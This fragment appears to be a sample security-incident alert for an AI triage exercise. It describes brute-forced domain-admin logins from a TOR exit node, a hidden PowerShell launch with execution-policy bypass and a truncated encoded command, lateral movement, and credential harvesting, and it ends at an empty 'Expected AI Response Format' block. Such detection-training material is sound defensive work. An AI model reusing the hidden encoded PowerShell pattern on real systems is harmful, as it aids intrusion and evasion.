Multiple failed login attempts detected from IP 185.220.101.45 targeting domain administrator account "DA-Admin", followed by successful authentication and immediate PowerShell execution: powershell.exe -windowstyle hidden -executionpolicy bypass -encodedcommand JABzAD0ATgBlAHcALQBPAGIA... on CORPDC01. Event occurred during off-hours (02:30 UTC) with unusual geolocation (TOR exit node). Subsequent lateral movement observed to file servers and backup systems with credential harvesting indicators.
```

**Expected AI Response Format**:

```text
